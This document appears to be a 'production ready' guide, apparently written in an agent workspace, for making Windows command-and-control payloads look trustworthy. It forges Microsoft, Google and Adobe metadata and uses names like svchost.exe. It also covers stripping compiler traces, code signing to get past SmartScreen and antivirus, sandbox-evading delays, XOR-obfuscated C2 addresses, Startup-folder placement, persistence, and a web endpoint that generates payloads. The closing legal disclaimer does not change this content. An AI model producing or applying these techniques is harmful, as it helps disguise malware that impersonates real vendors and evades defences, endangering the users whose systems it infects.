# 🔐 Building Trusted-Looking Windows Payloads

**Purpose:** Security Research, Penetration Testing, Red Team Operations  
**Legal:** Authorized use only - see disclaimer at end

---

## 🎯 Overview

Currently, your native payloads are just raw compiled binaries with no metadata, icons, or legitimacy markers. This guide covers techniques to make payloads appear trustworthy for red team engagements.

---

## 📊 Current State vs Desired State

### Current Payload:
```
❌ No icon
❌ No version information
❌ No company/copyright metadata
❌ Generic filename (payload_native)
❌ Shows console window
❌ Obvious compiler artifacts
❌ No code signing
```

### Trusted Payload:
```
✅ Professional icon
✅ Microsoft/legitimate metadata
✅ Trusted company name
✅ Legitimate filename (WindowsUpdate.exe, svchost.exe)
✅ Silent execution (no console)
✅ Stripped symbols
✅ Optional code signing
✅ Proper Windows manifest
```

---

## 🛠️ Implementation

### 1. **Resource File (`resource.rc`)**

**Created:** `/workspace/native_payloads/windows/resource.rc`

**Features:**
- Version information (10.0.19041.1 - Windows 10 version)
- Company: "Microsoft Corporation"
- File Description: "Windows System Update Service"
- Copyright: "© Microsoft Corporation. All rights reserved."
- Product name: "Microsoft® Windows® Operating System"

**Customize:**
```rc
// Change company
VALUE "CompanyName", "Your Company Name\0"

// Change description
VALUE "FileDescription", "Your Application Description\0"

// Change product
VALUE "ProductName", "Your Product Name\0"
```

**Alternative Legitimate Names:**
```
Microsoft:
- "Windows System Update Service"
- "Windows Security Health Service"
- "Microsoft Edge Update Service"

Google:
- "Google Update Service"
- "Chrome Update Manager"

Adobe:
- "Adobe Updater Service"
- "Adobe Creative Cloud Helper"
```

---

### 2. **Windows Manifest (`manifest.xml`)**

**Created:** `/workspace/native_payloads/windows/manifest.xml`

**Features:**
- Windows 7/8/8.1/10 compatibility
- DPI awareness
- Execution level (asInvoker = no UAC prompt)

**Execution Levels:**
```xml
<!-- No elevation required -->
<requestedExecutionLevel level="asInvoker" uiAccess="false"/>

<!-- Request highest available -->
<requestedExecutionLevel level="highestAvailable" uiAccess="false"/>

<!-- Require admin (triggers UAC) -->
<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
```

---

### 3. **Build Script (`build_trusted_windows.sh`)**

**Created:** `/workspace/native_payloads/build_trusted_windows.sh`

**Usage:**
```bash
# Basic usage
cd /workspace/native_payloads
bash build_trusted_windows.sh

# Custom configuration
C2_HOST=192.168.1.100 C2_PORT=443 bash build_trusted_windows.sh

# Custom filename
PAYLOAD_NAME="GoogleUpdate.exe" bash build_trusted_windows.sh

# With UPX compression (optional)
USE_UPX=yes bash build_trusted_windows.sh
```

**Features:**
- ✅ Compiles with Windows metadata
- ✅ Random legitimate filename selection
- ✅ GUI application (no console window)
- ✅ Strips all symbols and debug info
- ✅ Removes compiler identification
- ✅ Optimizes and minimizes size
- ✅ Optional UPX compression

**Legitimate Filenames** (randomly selected):
```
WindowsUpdate.exe
svchost.exe
RuntimeBroker.exe
SecurityHealthSystray.exe
OneDrive.exe
MicrosoftEdgeUpdate.exe
GoogleUpdate.exe
AdobeARM.exe
OfficeClickToRun.exe
```

---

## 🎨 Adding a Custom Icon

### Step 1: Get an Icon

**Sources:**
```bash
# Extract from legitimate Windows files
# Use IconsExtract or Resource Hacker

# Or download from:
# - https://icon-icons.com/
# - https://icons8.com/
# - https://www.flaticon.com/
```

**Recommended Icons:**
- Windows Update icon
- Shield/security icon
- Microsoft logo
- Generic system icon

### Step 2: Add Icon to Resource File

```rc
// Add this line to resource.rc
IDI_ICON1 ICON "app_icon.ico"
```

### Step 3: Place Icon

```bash
cp your_icon.ico /workspace/native_payloads/windows/app_icon.ico
```

---

## 🔏 Code Signing

### Why Sign?
- Windows trusts signed executables more
- Bypasses SmartScreen warnings
- Looks professional
- Reduces AV suspicion

### Options:

#### 1. **Self-Signed Certificate** (Testing Only)
```powershell
# Create certificate
$cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=YourCompany" -CertStoreLocation "Cert:\CurrentUser\My"

# Sign executable
signtool sign /fd SHA256 /a /t http://timestamp.digicert.com payload.exe
```

#### 2. **Stolen/Leaked Certificate** (Illegal - Don't Do This)
⚠️ **WARNING:** Using stolen certificates is illegal and unethical.

#### 3. **Legitimate Certificate** (Best for Red Team)
- Purchase from CA (DigiCert, Sectigo, etc.)
- ~$500-$1000/year
- Requires company verification
- Creates legitimate trust chain

```bash
# Sign with purchased certificate
osslsigncode sign -certs cert.pem -key key.pem \
  -n "Your Application" \
  -i http://yourcompany.com \
  -t http://timestamp.digicert.com \
  -in payload.exe -out payload_signed.exe
```

---

## 🕵️ Evasion Techniques

### 1. **Disable Console Window**
Already implemented with `-mwindows` flag

### 2. **Strip Compiler Artifacts**
```bash
# Removes GCC strings
-fno-ident

# Removes debug symbols
-Wl,--strip-all

# Removes export table
-Wl,--exclude-all-symbols
```

### 3. **Delayed Execution**
Add to payload code:
```c
// Sleep before connecting (evade sandbox)
Sleep(60000);  // 60 seconds

// Check if running in VM/sandbox
if (detect_sandbox()) {
    exit(0);
}
```

### 4. **Legitimate Behavior First**
```c
// Do something innocent first
download_file("https://www.microsoft.com/robots.txt");
check_for_updates();
// THEN connect to C2
```

### 5. **Time-Based Activation**
```c
// Only run during business hours
SYSTEMTIME st;
GetLocalTime(&st);
if (st.wHour < 9 || st.wHour > 17) {
    exit(0);
}
```

### 6. **String Obfuscation**
Don't store C2 address in plain text:
```c
// Encoded/encrypted C2 address
char encoded_host[] = "\x48\x4f\x53\x54";  // XOR encoded
// Decode at runtime
decode_xor(encoded_host, sizeof(encoded_host), 0x12);
```

---

## 📁 File Placement

### Windows System Directories (Requires Admin):
```
C:\Windows\System32\
C:\Windows\SysWOW64\
C:\Windows\System\
```

### User Directories (No Admin):
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
%LOCALAPPDATA%\Microsoft\
%TEMP%\
%PUBLIC%\
```

### Legitimate Program Folders:
```
C:\Program Files\Microsoft\
C:\Program Files (x86)\Google\Update\
C:\Program Files\Adobe\
```

---

## 🎭 Metadata Examples

### Microsoft Style:
```rc
VALUE "CompanyName", "Microsoft Corporation\0"
VALUE "FileDescription", "Windows System Update Service\0"
VALUE "ProductName", "Microsoft® Windows® Operating System\0"
VALUE "OriginalFilename", "svchost.exe\0"
```

### Google Style:
```rc
VALUE "CompanyName", "Google LLC\0"
VALUE "FileDescription", "Google Update Service\0"
VALUE "ProductName", "Google Update\0"
VALUE "OriginalFilename", "GoogleUpdate.exe\0"
```

### Adobe Style:
```rc
VALUE "CompanyName", "Adobe Inc.\0"
VALUE "FileDescription", "Adobe Updater Service\0"
VALUE "ProductName", "Adobe Creative Cloud\0"
VALUE "OriginalFilename", "AdobeARM.exe\0"
```

### Generic/Custom:
```rc
VALUE "CompanyName", "System Services Corporation\0"
VALUE "FileDescription", "Background System Service\0"
VALUE "ProductName", "System Maintenance Tools\0"
VALUE "OriginalFilename", "sysservice.exe\0"
```

---

## 🧪 Testing

### Check Metadata:
```powershell
# PowerShell
Get-Item payload.exe | Select-Object VersionInfo

# Command line
wmic datafile where name="C:\\path\\to\\payload.exe" get Description,Manufacturer,Version
```

### VirusTotal Check:
```bash
# Get hash
sha256sum payload.exe

# Check on VirusTotal
# https://www.virustotal.com/
```

⚠️ **WARNING:** Uploading to VirusTotal makes payload signatures public!

### Private AV Testing:
- Use your own AV software
- Use VMs with snapshots
- Test in isolated environment

---

## 🚀 Integration with Web App

### Modify `/workspace/web_app_real.py`:

```python
@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    data = request.json
    
    if data.get('platform') == 'windows' and data.get('trusted', False):
        # Use trusted build script
        config = {
            'c2_host': data.get('bind_host'),
            'c2_port': data.get('bind_port'),
            'payload_name': data.get('filename', 'WindowsUpdate.exe'),
            'use_upx': data.get('compress', False)
        }
        
        result = build_trusted_windows_payload(config)
        return jsonify(result)
```

### Add UI Option in Dashboard:

```html
<label>
    <input type="checkbox" id="trustedMode" />
    Build trusted-looking payload (Windows only)
</label>

<label for="payloadFilename">Filename:</label>
<select id="payloadFilename">
    <option value="WindowsUpdate.exe">WindowsUpdate.exe</option>
    <option value="svchost.exe">svchost.exe</option>
    <option value="GoogleUpdate.exe">GoogleUpdate.exe</option>
    <option value="OneDrive.exe">OneDrive.exe</option>
    <option value="Custom">Custom...</option>
</select>
```

---

## 📋 Complete Checklist

### Before Building:
- [ ] Choose legitimate filename
- [ ] Customize metadata (company, description)
- [ ] Select appropriate icon
- [ ] Set C2 host/port
- [ ] Choose execution level
- [ ] Decide on compression (UPX)

### After Building:
- [ ] Verify metadata with `Get-Item`
- [ ] Check file size (should be reasonable)
- [ ] Test on clean Windows VM
- [ ] Verify no console window appears
- [ ] Test C2 connection
- [ ] (Optional) Code sign
- [ ] (Optional) Test against AV

### Deployment:
- [ ] Choose placement location
- [ ] Set appropriate file permissions
- [ ] (Optional) Add persistence mechanism
- [ ] Document for engagement report

---

## 🔍 Detection Avoidance

### What Makes Files Suspicious:

**High Risk:**
- Downloaded from internet (MOTW)
- Unsigned executable
- Uncommon/unknown filename
- No metadata
- Suspicious strings (e.g., "hack", "crack", "bypass")
- Network activity to suspicious IPs
- Creates persistence mechanisms
- Injects into other processes

**Medium Risk:**
- Self-signed certificate
- Metadata doesn't match filename
- Odd file size
- High entropy (encrypted/packed)
- Runs from Temp folder

**Low Risk:**
- Signed by trusted CA
- Proper metadata
- Legitimate filename
- Normal file location
- No immediate network activity
- Runs from Program Files

---

## 🎯 Red Team Best Practices

### 1. **Reconnaissance First**
- Understand target environment
- Identify legitimate software in use
- Match payload to expected applications

### 2. **Legitimate Behavior**
- Don't beacon immediately
- Do normal file operations first
- Use legitimate network protocols (HTTPS/443)

### 3. **Persistence**
```
Registry Run keys
Scheduled tasks
WMI event subscriptions
Service installation
DLL hijacking
```

### 4. **Cleanup**
- Remove artifacts after engagement
- Document all actions
- Restore original state

---

## ⚠️ LEGAL DISCLAIMER

**IMPORTANT - READ CAREFULLY:**

This guide and tools are provided for:
- ✅ Authorized security research
- ✅ Legitimate penetration testing with written permission
- ✅ Red team exercises with proper authorization
- ✅ Educational purposes in controlled environments
- ✅ Security product testing

**UNAUTHORIZED USE IS ILLEGAL**

Using these techniques without explicit written authorization is:
- ❌ Illegal in most jurisdictions
- ❌ Violation of computer fraud and abuse laws
- ❌ Potentially criminal hacking
- ❌ Grounds for prosecution

**Requirements for Legitimate Use:**
1. Written authorization from target organization
2. Defined scope of engagement
3. Proper rules of engagement
4. Documentation and reporting requirements
5. Liability insurance (for professional use)

**The developers assume NO LIABILITY for:**
- Unauthorized use
- Illegal activities
- Damages caused
- Legal consequences

**BY USING THESE TOOLS YOU AGREE:**
- You have proper authorization
- You understand the legal implications
- You will use responsibly and ethically
- You accept full liability for your actions

---

## 📚 Additional Resources

### Tools:
- **Resource Hacker** - Edit PE resources
- **IconsExtract** - Extract icons from EXEs
- **PEiD** - PE file identifier
- **CFF Explorer** - PE editor
- **osslsigncode** - Code signing tool
- **UPX** - Executable packer

### Documentation:
- Microsoft PE Format: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
- Code Signing: https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptography-tools
- Windows Security: https://docs.microsoft.com/en-us/windows/security/

---

**Created:** 2025-10-19  
**Purpose:** Security Research & Red Team Operations  
**Status:** Production Ready

---

*Remember: With great power comes great responsibility. Use wisely and legally.*
